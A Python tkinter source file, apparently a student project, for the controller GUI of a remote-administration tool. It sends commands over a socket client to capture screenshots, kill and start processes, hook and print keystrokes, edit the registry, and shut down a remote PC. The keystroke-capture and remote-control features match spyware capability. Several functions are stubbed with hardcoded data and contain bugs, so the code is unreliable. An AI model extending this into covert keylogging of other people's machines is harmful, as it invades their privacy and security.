import tkinter
import Client
import io
import tkinter.ttk
from PIL import Image, ImageTk
import os
import winreg
from tkinter import filedialog
from configparser import ConfigParser

root = tkinter.Tk()
root.title("Client")

label1 = tkinter.Label(root, text="Client Handling")
label1.grid(row = 0, column = 0)

#input IP------------------------------------------------------------------------------------------------------
user_input = tkinter.StringVar(root)

Ipaddress = tkinter.Entry(root, textvariable = user_input)
Ipaddress.grid(row = 1, column = 0, pady = 2)

def buttonClick():
    Client.Connect(user_input)
   
connectbutton = tkinter.Button(root, text="connect", command= buttonClick)
connectbutton.grid(row = 1, column = 1, pady = 2)
#

#ScreenShot------------------------------------------------------------------------------------------------------
def Receive_PicData(typereq, newwind ,image_cap):
    image_data = Client.Send(typereq)
    print(image_data)
    #image_cap = Image.open(r"C:\\Users\\ACER\\Desktop\\wall5.png")
        
    image_cap.show()

    ratio = float(image_cap.size[0] / image_cap.size[1])
    resized = image_cap.resize((720,round(720 / ratio)))

    image = ImageTk.PhotoImage(resized)
    
    imagescreen = tkinter.Canvas(newwind, width = resized.size[0], height = resized.size[1])
    imagescreen.create_image(1,1,anchor = tkinter.NW, image = image)
    imagescreen.grid(row = 1)
    newwind.mainloop()

def Save_img(image_cap):
    image_cap.save(r'scr.bmp')
    
def PiccapWindow():
    newwind = tkinter.Toplevel(root)
    newwind.title("ScreenShot")

    image_cap = Image.new("RGB", (720,720), (255,255,255))
    capture = tkinter.Button(newwind, text ="take a photo", command = lambda: Receive_PicData("0", newwind, image_cap))
    capture.grid(row = 0, column = 0)

    save = tkinter.Button(newwind, text="save", command = lambda: Save_img(image_cap))
    save.grid(row = 0, column = 1)
    newwind.mainloop()

screenshotButton = tkinter.Button(root, text ="take screenshot", command = PiccapWindow)
screenshotButton.grid(row = 2,column = 0)
#

#Process------------------------------------------------------------------------------------------------------
def show(FrameListbox):
    FrameListbox.grid(row = 2, columnspan = 4)

def inputIDKill(title_name, FrameListbox):
    Killwindow = tkinter.Toplevel(root)
    Killwindow.title(title_name)

    input = tkinter.StringVar(Killwindow)
    ID_Proc = tkinter.Entry(Killwindow, textvariable = input)
    ID_Proc.grid(row = 0, column = 0)

    killButton = tkinter.Button(Killwindow, text = "Kill", command = lambda: Kill(input.get(), FrameListbox))
    killButton.grid(row = 1, column = 0)

def Kill(ID, FrameListbox):
    Client.Send("2|" + ID)

    x = 0
    ListBox = FrameListbox.winfo_children()[1]
    for x in range(ListBox.size()):
        if(ListBox.get(x) == ID):
            ListBox.delete(x)
            FrameListbox.winfo_children()[0].delete(x)
            FrameListbox.winfo_children()[2].delete(x)
            break
    show(FrameListbox)
   
    #10.124.2.65
def View_Process(newwind, FrameListBox):
    #List_app_str = Client.Send("1").decode()
    List_app_str = "21354_4543_531|1321_44_4"
    print (List_app_str)
    group_proc = List_app_str.split("|")

    if(FrameListBox.winfo_children()[0].size() > 0):
        show(FrameListBox)
        return

    
    for x in group_proc:
        process = x.split("_")
        i = 0
        for ListBox in FrameListBox.winfo_children():
            ListBox.insert(tkinter.END, process[i])
            i += 1
        
    
    show(FrameListBox)
    newwind.mainloop()

def inputName_Start(title_name, ListBox):
    Startwindow = tkinter.Toplevel(root)
    Startwindow.title(title_name)

    input = tkinter.StringVar(Startwindow)
    Name_proc = tkinter.Entry(Startwindow, textvariable = input)
    Name_proc.grid(row = 0, column = 0)

    startButton = tkinter.Button(Startwindow, text = "Start", command = lambda: Start_Process(input.get(), ListBox))
    startButton.grid(row = 1, column = 0)

def Start_Process(Name, FrameListBox):
    receive_proc = Client.Send("3|" + Name + ".exe").decode()
    # exception
    process = receive_proc.split("_")
    i = 0
    for ListBox in FrameListBox.winfo_children():
        try:
            ListBox.insert(tkinter.END, process[i])
            i += 1
        except:
            pass

    show(ListBox)
    

def Delete_Process(newwind, FrameListBox):
    for ListBox in FrameListBox.winfo_children():
        ListBox.delete(0, tkinter.END)
    show(ListBox)

def ProcessWindow():
    newwind = tkinter.Toplevel(root)
    newwind.title("Process")

    FrameName = tkinter.Frame(newwind, width = 20)
    FrameName.grid(row = 1, columnspan = 4)
    tkinter.Label(FrameName, text ="Name", width = 15, height = 1).grid(row = 1, column = 0)
    tkinter.Label(FrameName, text = "ID", width = 15, height = 1).grid(row = 1, column = 1)
    tkinter.Label(FrameName, text= "Thread", width = 15, height = 1).grid(row = 1, column = 2)

    #Frame for Listbox view
    FrameListbox = tkinter.Frame(newwind, width = 20)
    FrameListbox.grid(row = 2, columnspan = 4)
    tkinter.Listbox(FrameListbox, width = 15, height = 10).grid(row = 2, column = 0)
    tkinter.Listbox(FrameListbox, width = 15, height = 10).grid(row = 2, column = 1)
    tkinter.Listbox(FrameListbox, width = 15, height = 10).grid(row = 2, column = 2)

    
    
    killb = tkinter.Button(newwind, text ="Kill", command = lambda: inputIDKill("Kill", FrameListbox))
    killb.grid(row = 0, column = 0)

    startb = tkinter.Button(newwind, text ="Start", command = lambda: inputName_Start("Start", FrameListbox))
    startb.grid(row = 0, column = 1)

    viewb = tkinter.Button(newwind, text ="View",  command = lambda: View_Process(newwind, FrameListbox))
    viewb.grid(row = 0, column = 2)

    delb = tkinter.Button(newwind, text ="Delete", command = lambda: Delete_Process(newwind, FrameListbox))
    delb.grid(row = 0, column = 3)
process = tkinter.Button(root, text ="Process", command = ProcessWindow)
process.grid(row = 2,column = 1)
#

#App------------------------------------------------------------------------------------------------------

def inputIDKill_App(title_name):
    Killwindow = tkinter.Toplevel(root)
    Killwindow.title(title_name)

    input = tkinter.StringVar(Killwindow)
    ID_App = tkinter.Entry(Killwindow, textvariable = input)
    ID_App.grid(row = 0, column = 0)

    killButton = tkinter.Button(Killwindow, text = "Kill", command = lambda: Kill_App(input))
    killButton.grid(row = 1, column = 0)

def Kill_App(ID):
    Client.Send("KILL_" + ID)
    print(ID)
def View_App(process_list, newwind):
    List_app_str = "3_1_5|5_8_1" #Client.Send("View").decode("utf-8")
    group_proc = List_app_str.split("|")
    

    for x in group_proc:
        process = {}
        data = x.split("_")
        process = {"name" : data[0], "ID" : data[1], "Threads": data[2]}
        process_list.append(process)
    newwind.mainloop()

   

def AppWindow():
    newwind = tkinter.Toplevel(root)
    newwind.title("Process")

App = tkinter.Button(root, text ="App", command = AppWindow)
App.grid(row = 3,column = 0)
#

#Hook---------------------------------------------------------------------------------------------

def startHook(typereq):
    Client.Send(typereq).decode()

def Unhook(typereq):
    Client.Send(typereq)

def deleteText(textbox):
    textbox.delete(0,tkinter.END)

def printtext(typereq,textbox):
    try:
        data = Client.Send(typereq).decode()
        print(data)
        if(data == "<NONE>"):
            pass
        textbox.insert(tkinter.END, data)
    except: 
        pass

def HookWindow():
    newwind = tkinter.Toplevel(root)
    newwind.title("KeyStroke")

    textbox = tkinter.Text(newwind, height=20)

    hook = tkinter.Button(newwind, text ="Hook", command = lambda: startHook("5"))
    hook.grid(row = 0, column = 0)

    unhook_button = tkinter.Button(newwind, text ="Unhook", command = lambda: Unhook("7"))
    unhook_button.grid(row = 0, column = 1)

    printkey = tkinter.Button(newwind, text ="Print", command = lambda: printtext("6", textbox))
    printkey.grid(row = 0, column = 2)

    delete = tkinter.Button(newwind, text ="Delete", command = lambda: deleteText(textbox))
    delete.grid(row = 0, column= 3)

    textbox.grid(row = 1, columnspan = 4)

    newwind.mainloop()

KeyHook = tkinter.Button(root, text = "KeyStroke", command = HookWindow)
KeyHook.grid(row = 4, column = 0)

#Registry------------------------------------------------------------------------------------------------------

def browse_file(file_path, file_pad):
    file_reg = filedialog.askopenfilename(initialdir = "\\",
                                          title = "Select a File", filetypes = (("Registry files","*.reg"),))
    file_path.insert(tkinter.END, file_reg)
    f = io.open(file_reg, encoding='utf-16')
    data = f.read()
    f.close()

    file_pad.insert(tkinter.END,data)

def save_reg(file_path,file_pad):
    f = io.open(file_path.get(), 'wb')
    
    f.write(bytes(file_pad.get("1.0", tkinter.END),encoding= 'utf-16'))
    f.close()

def Hide_component(comp1 , comp2):
    comp1.grid_forget()
    comp2.grid_forget()
def Show_component(comp1, comp2):
    comp1.grid(row = 4, column = 1)
    comp2.grid(row = 4, column = 2)

def clear_message(text_pad):
    text_pad.delete("1.0", tkinter.END)

def RegistryWindow():
    newwind = tkinter.Toplevel(root)
    newwind.title("Registry Editor")

    file_pad = tkinter.Text(newwind, width = 60, height = 10)
    file_pad.grid(row = 1, columnspan = 2, sticky = "W")

    path_link = tkinter.Entry(newwind, width = 80)
    path_link.grid(row = 0, column = 0,columnspan = 2)

    browse = tkinter.Button(newwind, text = "browse", width = 10, command = lambda: browse_file(path_link, file_pad))
    browse.grid(sticky = "W",row = 0, column = 2)

    save_button = tkinter.Button(newwind, text = "Save", height = 5, width  = 10, command = lambda: save_reg(path_link, file_pad))
    save_button.grid(row = 1, column = 2, sticky = "W")

    var = tkinter.StringVar(newwind)
    var.set("Choose option") # default value

    vType = tkinter.StringVar(newwind)
    vType.set("Data type")

    option = ["Get value", "Set value", "Delete value", "Create key", "Delete key"]
    v_type = ["String", "Binary", "DWORD", "QWORD", "Multi-String", "Expandable String"]

    
    pathText = tkinter.Entry(newwind, width = 90)
    pathText.grid(row = 3, column = 0 ,columnspan = 3)

    valueNameText = tkinter.Entry(newwind)
    valueNameText.grid(sticky = "w", row = 4, column = 0)

    valueValueText = tkinter.Entry(newwind)
    valueValueText.grid(row = 4, column = 1)

    valueType = tkinter.OptionMenu(newwind, vType, *v_type)
    valueType.config(bg = "WHITE") 
    valueType.grid(row = 4, column = 2)

    
    messageText = tkinter.Text(newwind)
    messageText.grid(row = 5, columnspan = 3)

    def MakeUI(event):
        if var.get() != "Set value":
            if var.get() == "Create key" or var.get() == "Delete key":
                valueNameText.grid_forget()
            else: 
                valueNameText.grid(row = 4, column = 0)
            Hide_component(valueType, valueValueText)
        else:
            valueNameText.grid(row = 4, column = 0)
            Show_component(valueValueText, valueType)
            
    label_edit = tkinter.Label(newwind, text = "Edit Value/Key", width = 10)
    label_edit.grid(sticky = "w",row = 2, column = 0)
    w = tkinter.OptionMenu(newwind, var, *option ,command = MakeUI)
    w.config(width = 60, anchor = tkinter.W)
    w.grid(sticky = tkinter.W, row = 2, column = 1, columnspan = 2)       

    def GetValue():
        data = f'10|{pathText.get()}|{valueNameText.get()}'
        gotvalue =  Client.Send(data).decode() + "\n"
        messageText.insert(tkinter.END, gotvalue)
        
    def SetValue():
        data = f'11|{pathText.get()}|{valueNameText.get()}|{vType.get()}|{valueValueText.get()}'
        gotvalue =  Client.Send(data).decode() + "\n"
        messageText.insert(tkinter.END, gotvalue)
 #HKEY_CURRENT_USER\TEST
    def DelValue():
        data = f'12|{pathText.get()}|{valueNameText.get()}'
        gotvalue = Client.Send(data).decode() + "\n"
        messageText.insert(tkinter.END, gotvalue)

    def CreateKey():
        data = f'8|{pathText.get()}'
        gotvalue =  Client.Send(data).decode() + "\n"
        messageText.insert(tkinter.END, gotvalue)

    def DelKey():
        data = f'9|{pathText.get()}'
        gotvalue =  Client.Send(data).decode() + "\n"
        messageText.insert(tkinter.END, gotvalue)

    Edit_list = {
    "Get value" : GetValue,
    "Set value" : SetValue,
    "Delele value" : DelValue,
    "Create key" : CreateKey,
    "Delete key" : DelKey
    }

    def Function_Switch():
        switch = Edit_list.get (var.get(), None)
        if switch is not None:
            switch()

    send = tkinter.Button(newwind, text = "Send", width = 20 ,command = Function_Switch)
    send.grid(row = 6, column = 0)

    delete_message_button = tkinter.Button(newwind, text = "Delete", width = 20, commad = clear_message(file_pad))
    delete_message_button.grid(row = 6, column = 1)
    newwind.mainloop()



Registry = tkinter.Button(root, text = "Registry", command = RegistryWindow)
Registry.grid(row = 4, column = 1)
#

#Shutdown------------------------------------------------------------------------------------------------------
def shutWind():
    Client.Send("Shutdown")

Shutdown = tkinter.Button(root, text ="Shut down", command = shutWind)
Shutdown.grid(row = 3, column = 1)
#


root.mainloop()

